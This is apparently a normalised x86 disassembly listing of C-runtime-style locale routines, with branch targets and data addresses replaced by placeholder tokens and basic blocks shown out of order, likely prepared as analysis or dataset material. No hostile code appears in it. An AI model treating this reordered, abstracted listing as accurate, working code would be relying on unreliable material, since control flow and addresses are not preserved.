jl r-xdata
jmp r-xdata
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebx + 0x84 ]
mov esi [ ebp + 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebx + 0x84 ]
mov edi [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x84 ]
xor ecx ecx
mov eax [ eax + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x84 ]
inc ecx
mov eax [ eax + 0x30 ]
mov [ esi + 0x30 ] eax
mov eax [ ebx + 0x84 ]
mov eax [ eax + 0x34 ]
mov [ esi + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ecx
test edi edi
je r-xdata
inc edx
mov esi edx
sub al 0x30
mov [ edx ] al
mov al [ esi + 0x1 ]
mov [ esi ] al
lea esi [ esi + 0x1 ]
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_435fb3
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_422732
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_422732
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_422732
pop ecx
mov eax [ esi + 0x34 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_422732
pop ecx
push eax
call sub_422732
pop ecx
sub_43601a
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx [ ebp + 0x8 ]
xor eax eax
push esi
push edi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] eax
cmp [ ebx + 0xb0 ] eax
jne r-xdata
xor esi esi
inc esi
push 0x50
push esi
mov [ ebp - 0x8 ] esi
call sub_4266a7
pop ecx
pop ecx
mov [ ebp + 0x8 ] eax
test eax eax
jne r-xdata
cmp [ ebx + 0xac ] eax
jne r-xdata
mov esi [ ebx + 0x84 ]
push 0x14
pop ecx
mov edi eax
push 0x4
[ edi ] [ esi ]
call sub_4266f1
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
mov edi eax
mov [ ebp - 0x4 ] eax
mov esi rw-data
jmp r-xdata
xor edi edi
mov [ eax ] edi
cmp [ ebx + 0xb0 ] edi
je r-xdata
push [ ebp + 0x8 ]
call sub_422732
xor eax eax
pop ecx
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x7c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
mov eax [ rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
mov [ esi + 0x8 ] eax
mov eax [ rw-data ]
mov [ esi + 0x30 ] eax
mov eax [ rw-data ]
mov [ esi + 0x34 ] eax
jmp r-xdata
push 0x4
call sub_4266f1
pop ecx
mov [ ebp - 0xc ] eax
test eax eax
je r-xdata
cmp [ ebx + 0x78 ] 0x0
je r-xdata
push [ ebx + 0x7c ]
call [ InterlockedDecrement@IAT ]
mov ecx [ ebp - 0x4 ]
xor eax eax
inc eax
mov [ ecx ] eax
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_422732
mov ecx [ ebp - 0x4 ]
push ecx
call sub_422732
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
mov [ eax ] edi
mov edi [ ebx + 0xb0 ]
push 0xe
push edi
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_429edd
mov ecx [ ebp + 0x8 ]
add ecx 0x4
push ecx
push 0xf
push edi
mov esi eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x8
push eax
push 0x10
push edi
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add eax 0x30
push eax
push 0xe
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_429edd
or esi eax
mov eax [ ebp + 0x8 ]
add esp 0x50
add eax 0x34
push eax
push 0xf
push edi
lea eax [ ebp - 0x14 ]
push 0x2
push eax
call sub_429edd
add esp 0x14
or eax esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x78 ] eax
mov [ ebx + 0x7c ] edi
mov [ ebx + 0x84 ] esi
xor eax eax
push [ ebx + 0x78 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ edi ] eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
jmp r-xdata
push [ ebp + 0x8 ]
call sub_435fb3
or [ ebp - 0x8 ] 0xffffffff
pop ecx
push [ ebx + 0x78 ]
call sub_422732
push [ ebx + 0x84 ]
call sub_422732
pop ecx
pop ecx
cmp [ edx ] 0x0
jne r-xdata
mov al [ edx ]
cmp al 0x30
jl r-xdata
mov edi [ ebp - 0xc ]
mov esi [ ebp + 0x8 ]
cmp al 0x3b
jne r-xdata
cmp al 0x39
jg r-xdata
inc edx
mov esi edx
sub al 0x30
mov [ edx ] al
mov al [ esi + 0x1 ]
mov [ esi ] al
lea esi [ esi + 0x1 ]
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_436222
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_422732
push [ esi + 0x8 ]
call sub_422732
push [ esi + 0xc ]
call sub_422732
push [ esi + 0x10 ]
call sub_422732
push [ esi + 0x14 ]
call sub_422732
push [ esi + 0x18 ]
call sub_422732
push [ esi ]
call sub_422732
push [ esi + 0x20 ]
call sub_422732
push [ esi + 0x24 ]
call sub_422732
push [ esi + 0x28 ]
call sub_422732
push [ esi + 0x2c ]
call sub_422732
push [ esi + 0x30 ]
call sub_422732
push [ esi + 0x34 ]
call sub_422732
push [ esi + 0x1c ]
call sub_422732
push [ esi + 0x38 ]
call sub_422732
push [ esi + 0x3c ]
call sub_422732
add esp 0x40
push [ esi + 0x40 ]
call sub_422732
push [ esi + 0x44 ]
call sub_422732
push [ esi + 0x48 ]
call sub_422732
push [ esi + 0x4c ]
call sub_422732
push [ esi + 0x50 ]
call sub_422732
push [ esi + 0x54 ]
call sub_422732
push [ esi + 0x58 ]
call sub_422732
push [ esi + 0x5c ]
call sub_422732
push [ esi + 0x60 ]
call sub_422732
push [ esi + 0x64 ]
call sub_422732
push [ esi + 0x68 ]
call sub_422732
push [ esi + 0x6c ]
call sub_422732
push [ esi + 0x70 ]
call sub_422732
push [ esi + 0x74 ]
call sub_422732
push [ esi + 0x78 ]
call sub_422732
push [ esi + 0x7c ]
call sub_422732
add esp 0x40
push [ esi + 0x80 ]
call sub_422732
push [ esi + 0x84 ]
call sub_422732
push [ esi + 0x88 ]
call sub_422732
push [ esi + 0x8c ]
call sub_422732
push [ esi + 0x90 ]
call sub_422732
push [ esi + 0x94 ]
call sub_422732
push [ esi + 0x98 ]
call sub_422732
push [ esi + 0x9c ]
call sub_422732
push [ esi + 0xa0 ]
call sub_422732
push [ esi + 0xa4 ]
call sub_422732
push [ esi + 0xa8 ]
call sub_422732
push [ esi + 0xb8 ]
call sub_422732
push [ esi + 0xbc ]
call sub_422732
push [ esi + 0xc0 ]
call sub_422732
push [ esi + 0xc4 ]
call sub_422732
push [ esi + 0xc8 ]
call sub_422732
add esp 0x40
push [ esi + 0xcc ]
call sub_422732
push [ esi + 0xb4 ]
call sub_422732
push [ esi + 0xd4 ]
call sub_422732
push [ esi + 0xd8 ]
call sub_422732
push [ esi + 0xdc ]
call sub_422732
push [ esi + 0xe0 ]
call sub_422732
push [ esi + 0xe4 ]
call sub_422732
push [ esi + 0xe8 ]
call sub_422732
push [ esi + 0xd0 ]
call sub_422732
push [ esi + 0xec ]
call sub_422732
push [ esi + 0xf0 ]
call sub_422732
push [ esi + 0xf4 ]
call sub_422732
push [ esi + 0xf8 ]
call sub_422732
push [ esi + 0xfc ]
call sub_422732
push [ esi + 0x100 ]
call sub_422732
push [ esi + 0x104 ]
call sub_422732
add esp 0x40
push [ esi + 0x108 ]
call sub_422732
push [ esi + 0x10c ]
call sub_422732
push [ esi + 0x110 ]
call sub_422732
push [ esi + 0x114 ]
call sub_422732
push [ esi + 0x118 ]
call sub_422732
push [ esi + 0x11c ]
call sub_422732
push [ esi + 0x120 ]
call sub_422732
push [ esi + 0x124 ]
call sub_422732
push [ esi + 0x128 ]
call sub_422732
push [ esi + 0x12c ]
call sub_422732
push [ esi + 0x130 ]
call sub_422732
push [ esi + 0x134 ]
call sub_422732
push [ esi + 0x138 ]
call sub_422732
push [ esi + 0x13c ]
call sub_422732
push [ esi + 0x140 ]
call sub_422732
push [ esi + 0x144 ]
call sub_422732
add esp 0x40
push [ esi + 0x148 ]
call sub_422732
push [ esi + 0x14c ]
call sub_422732
push [ esi + 0x150 ]
call sub_422732
push [ esi + 0x154 ]
call sub_422732
push [ esi + 0x158 ]
call sub_422732
push [ esi + 0x15c ]
call sub_422732
push [ esi + 0x160 ]
call sub_422732
add esp 0x1c
sub_4365a2
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0xb4 ] 0x0
je r-xdata
mov esi rw-data
xor ebx ebx
push 0x164
inc ebx
push ebx
call sub_4266a7
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
mov [ edi + 0x9c ] esi
xor eax eax
add eax 0xb0
push eax
call [ InterlockedDecrement@IAT ]
push edi
push esi
call sub_43661e
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov [ esi + 0xb0 ] ebx
jmp r-xdata
push esi
call sub_436222
push esi
call sub_422732
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi + 0x9c ]
cmp eax rw-data
je r-xdata
sub_43661e
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov ebx [ esi + 0xb4 ]
test edi edi
jne r-xdata
push ebx
call sub_42fade
and [ ebp - 0x4 ] 0x0
mov [ edi + 0x160 ] eax
lea eax [ edi + 0x4 ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
mov [ ebp - 0x8 ] esi
call sub_429edd
lea ecx [ edi + 0x8 ]
push ecx
push 0x32
push ebx
mov esi eax
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0xc ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
add esp 0x40
or esi eax
lea eax [ edi + 0x10 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x14 ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x18 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
push edi
push 0x37
push ebx
or esi eax
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0x20 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x24 ]
push eax
push 0x2b
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x28 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x2c ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0x30 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x34 ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x1c ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x38 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0x3c ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x40 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x44 ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x48 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0x4c ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x50 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x54 ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x58 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0x5c ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x60 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x64 ]
push eax
push 0x4f
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x68 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0x6c ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x70 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x74 ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x78 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0x7c ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x80 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x84 ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x88 ]
push eax
push 0x40
push ebx
push 0x1
lea eax [ ebp - 0x8 ]
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0x8c ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x90 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x94 ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x98 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0x9c ]
push eax
push 0x29
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0xa0 ]
push eax
push 0x1f
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0xa4 ]
push eax
push 0x20
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0xa8 ]
push eax
push 0x1003
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0xac ]
push eax
push 0x1009
push ebx
lea eax [ ebp - 0x8 ]
push 0x0
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0xb8 ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0xbc ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0xc0 ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0xc4 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0xc8 ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0xcc ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0xb4 ]
push eax
push 0x37
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0xd4 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0xd8 ]
push eax
push 0x2b
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0xdc ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0xe0 ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0xe4 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0xe8 ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0xd0 ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0xec ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0xf0 ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0xf4 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0xf8 ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0xfc ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0x100 ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x104 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x108 ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x10c ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0x110 ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x114 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x118 ]
push eax
push 0x4f
push ebx
push 0x2
lea eax [ ebp - 0x8 ]
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x11c ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0x120 ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x124 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x128 ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x12c ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0x130 ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x134 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x138 ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x13c ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0x140 ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x144 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x148 ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x14c ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
add esp 0x50
or esi eax
lea eax [ edi + 0x150 ]
push eax
push 0x29
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x154 ]
push eax
push 0x1f
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x158 ]
push eax
push 0x20
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
or esi eax
lea eax [ edi + 0x15c ]
push eax
push 0x1003
push ebx
lea eax [ ebp - 0x8 ]
push 0x2
push eax
call sub_429edd
add esp 0x50
or eax esi
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_436e12
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx edi [ edx ]
movzx ecx [ esi ]
sub ecx edi
jne r-xdata
pop edi
pop esi
test ecx ecx
jns r-xdata
sub esi edx
jle r-xdata
or ecx 0xffffffff
jmp r-xdata
add edx 0x2
movzx edi [ edx ]
movzx ecx [ esi + edx ]
sub ecx edi
je r-xdata
mov eax ecx
pop ebp
retn
xor ecx ecx
inc ecx
test di di
je r-xdata
sub_436e50
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
xor edx edx
push esi
push edi
mov eax ecx
cmp [ ecx ] dx
je r-xdata
pop edi
sub eax ecx
pop esi
sar eax 0x1
pop ebx
leave
retn
mov edi [ ebp + 0xc ]
movzx ebx [ edi ]
add eax 0x2
cmp [ eax ] dx
jne r-xdata
movzx ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov esi edi
test bx bx
je r-xdata
add esi 0x2
movzx edx [ esi ]
test dx dx
jne r-xdata
cmp dx [ ebp - 0x4 ]
je r-xdata
xor edx edx
sub_436e9f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
movzx ecx [ eax ]
push esi
push edi
test cx cx
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
movzx ebx [ edi ]
add eax 0x2
movzx ecx [ eax ]
test cx cx
jne r-xdata
mov edx ebx
mov esi edi
test bx bx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
add esi 0x2
movzx edx [ esi ]
test dx dx
jne r-xdata
cmp dx cx
je r-xdata
sub_436ee1
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0xb0 ]
or [ esi + 0x8 ] 0x104
push 0x55
push eax
call sub_4296b9
pop ecx
pop ecx
cmp eax 0x1
jle r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_421ed7
leave
retn
lea eax [ ebp - 0xb0 ]
push eax
call sub_427b65
inc eax
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea eax [ esi + 0x250 ]
push 0x55
push eax
call sub_424aa8
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42a241
int3
sub_436f58
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push [ esi ]
call sub_427b65
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_427b65
sub eax 0x3
neg eax
sbb eax eax
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
push [ esi ]
call sub_437016
pop ecx
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test [ esi + 0x8 ] 0x200
je r-xdata
push 0x0
push 0x3
push sub_437048
mov [ esi + 0xc ] eax
call sub_42964d
add esp 0xc
test [ esi + 0x8 ] 0x100
je r-xdata
test [ esi + 0x8 ] 0x7
jne r-xdata
pop esi
pop ebp
retn
sub_436fcc
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push [ esi ]
call sub_427b65
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
push [ esi ]
call sub_437016
pop ecx
push 0x2
pop eax
jmp r-xdata
pop esi
pop ebp
retn
and [ esi + 0x8 ] 0x0
push 0x0
push 0x3
push sub_437266
mov [ esi + 0xc ] eax
call sub_42964d
add esp 0xc
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_437016
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor edx edx
test ecx ecx
jne r-xdata
movzx eax [ ecx ]
add ecx 0x2
cmp ax 0x41
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0xffffff9f
cmp ax 0x19
ja r-xdata
cmp ax 0x5a
jbe r-xdata
mov eax edx
pop ebp
retn
inc edx
jmp r-xdata
sub_437048
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x88 ] esi
call sub_42f4f6
lea ebx [ eax + 0x9c ]
push 0x40
mov ecx [ ebx + 0x14 ]
neg ecx
sbb ecx ecx
lea eax [ ebp - 0x84 ]
and ecx 0xfffff005
push eax
add ecx 0x1002
push ecx
push esi
call sub_42968a
add esp 0x10
test eax eax
jne r-xdata
push edi
lea eax [ ebp - 0x84 ]
push eax
push [ ebx + 0x4 ]
call sub_424898
pop ecx
pop ecx
mov edi 0xfffff002
test eax eax
jne r-xdata
and [ ebx + 0x8 ] eax
inc eax
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov ecx 0x300
and eax ecx
cmp eax ecx
je r-xdata
push 0x40
lea eax [ ebp - 0x84 ]
push eax
mov eax [ ebx + 0x10 ]
neg eax
sbb eax eax
and eax edi
add eax 0x1001
push eax
push esi
call sub_42968a
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn 0xc
mov eax [ ebx + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
mov ecx [ ebx + 0x10 ]
neg ecx
sbb ecx ecx
push 0x80
lea eax [ ebp - 0x84 ]
and ecx edi
push eax
add ecx 0x1001
push ecx
push esi
call sub_42968a
add esp 0x10
test eax eax
jne r-xdata
and [ ebx + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
lea eax [ ebp - 0x84 ]
push eax
push [ ebx ]
call sub_424898
pop ecx
pop ecx
test eax eax
jne r-xdata
